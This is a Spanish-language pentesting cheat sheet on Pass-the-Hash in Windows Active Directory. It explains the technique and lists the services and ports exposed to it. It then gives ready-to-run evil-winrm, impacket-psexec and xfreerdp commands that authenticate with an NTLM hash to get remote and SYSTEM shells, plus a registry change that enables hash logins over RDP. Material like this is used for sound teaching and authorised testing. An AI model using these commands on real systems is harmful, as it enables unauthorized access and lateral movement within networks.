# Pass The Hash 

Tags: #AD #Windows #PassTheHash 

Pass-the-Hash (PtH) es una técnica de ataque que permite a un atacante autenticarse en un recurso remoto utilizando el hash de la contraseña NTLM o LanMan de un usuario, sin necesidad de conocer la contraseña en texto claro. Esta técnica es viable debido a la forma en que Windows gestiona la autenticación a través de estos protocolos.

```bash 
1. Obtención del Hash:
    - El ataque comienza con la adquisición de hashes de contraseñas del sistema de un usuario. Esto puede hacerse a través de varias técnicas, como el dumping de la base de datos SAM (Security Account Manager), uso de herramientas como Mimikatz para extraer hashes directamente de la memoria o a través de técnicas como el ataque DCSync.
        
2. Uso del Hash:
    - Una vez obtenidos, estos hashes pueden ser usados en lugar de la contraseña original para autenticarse contra otros servicios o máquinas que confían en el protocolo de autenticación NTLM.
        
3. Evitando la Necesidad de Descifrar:
    - La ventaja para el atacante es que no necesita descifrar el hash para obtener la contraseña en texto claro. El protocolo NTLM permite la autenticación utilizando directamente el hash, que actúa de forma similar a una contraseña.
        
4. Movimiento Lateral:
    - Utilizando esta técnica, los atacantes pueden moverse lateralmente dentro de una red, accediendo a otras máquinas y servicios que reconocen al usuario cuyos hashes han sido obtenidos.
```

## Identificando servicios para realizar el PTH

```bash 
1. SMB (Server Message Block)
- Uso en PtH: SMB es a menudo el objetivo principal en ataques PtH, especialmente en versiones anteriores como SMBv1 y SMBv2.
- Cómo Funciona: En un ataque PtH, un atacante utiliza el hash NTLM de un usuario para autenticarse en un servidor o recurso compartido a través de SMB.
- Puertos:
    - TCP 445 para SMB directo sobre TCP/IP.
    - TCP 139 y UDP 137-138 en redes que usan NetBIOS sobre TCP/IP.


2. RDP (Remote Desktop Protocol)
- Uso en PtH: En ciertas configuraciones y versiones de RDP, es posible utilizar PtH para autenticarse.
- Restricciones Actuales: Las versiones más recientes de RDP y las configuraciones seguras han mitigado en gran medida la efectividad de PtH, aunque sigue siendo un vector potencial dependiendo de la configuración del sistema.
- Puertos:
    - TCP 3389 es el puerto predeterminado utilizado por RDP.
        

3. WinRM (Windows Remote Management)
- Uso en PtH: WinRM puede ser susceptible a PtH, permitiendo a un atacante ejecutar comandos remotamente utilizando el hash de un usuario.
- Consideraciones: La configuración de seguridad y las versiones de WinRM influyen en su vulnerabilidad a PtH.
- Puertos:
    - HTTP: TCP 5985 es el puerto predeterminado para WinRM 2.0 (y posteriores) sobre HTTP.
    - HTTPS: TCP 5986 es el puerto utilizado para WinRM sobre HTTPS.


4. WMI (Windows Management Instrumentation)
- Uso en PtH: A través de WMI, es posible ejecutar comandos o scripts en sistemas remotos utilizando hashes de credenciales.
- Contexto: WMI es comúnmente utilizado para administración remota, lo que lo convierte en un objetivo atractivo para PtH.
- Puertos:
    - WMI utiliza DCOM (Distributed Component Object Model), que a su vez usa un rango de puertos dinámicos. Por defecto, estos están en el rango de TCP 1024-65535.
    - Para simplificar la administración de la red, se puede configurar DCOM para usar un conjunto más pequeño de puertos estáticos.


5. MSSQL (Microsoft SQL Server)
- Uso en PtH: Si SQL Server está configurado para autenticación integrada de Windows, un atacante podría utilizar PtH para conectarse.
- Dependencia de Configuración: La vulnerabilidad a PtH depende de cómo esté configurado SQL Server y del entorno de red.
- Puertos:
    - El puerto predeterminado para MSSQL Server es TCP 1433.
    - Para SQL Server Browser, se utiliza UDP 1434.
```

## Utilizando Evil-WinRm

```powershell
❯ evil-winrm -u "domain1.corp\admin" -H 64fbae31cc352fc26af97cbdef151e03 -i 3.14.245.175 

	❯ whoami
	❯ hostname
	❯ ipconfig

Nota: Este 'Pas-The-Hash' nos devolvera una consola con el usuario 'Admin' 
```

## Utilizando impacket-psexec

```bash 
Nota: Es mejor hacer 'Pass-The-Hash' de esta manera, ya que entrega una consola con los permisos de 'NT Authority\System' teniendo un usuario en el grupo de 'Administrator'
```

```powershell
❯ impacket-psexec -hashes :64fbae31cc352fc26af97cbdef151e03 domain1.corp/admin@3.14.245.175

	❯ whoami
	❯ hostname
	❯ ipconfig
```

## Utilizando RDP

```powershell 
RDP no soporta de manera directa la autenticación basada en hash; en su lugar, emplea su propio mecanismo de autenticación que requiere la contraseña en texto claro o un ticket válido de Kerberos. No obstante, RDP cuenta con una función llamada "Restricted Admin Mode", que permite una forma de autenticación similar a la técnica Pass-the-Hash (PtH).

❯ xfreerdp /u:"admin" /pth:"64fbae31cc352fc26af97cbdef151e03" /v:3.14.245.175 -wallpaper +clipboard /dynamic-resolution +window-drag
```

```powershell
# Activar "Restricted Admin Mode" el cual fue introducido en RDP para mitigar los ataques de robo de credenciales en servidores que ejecutan versiones de Windows a partir de Windows 8.1 y Windows Server 2012 R2. En este modo, las credenciales del administrador no se pasan al servidor al que se está conectando. Esto significa que, si el servidor es comprometido, el atacante no podrá obtener las credenciales de quien inició la sesión a través de RDP.

❯ New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Forcepwer
```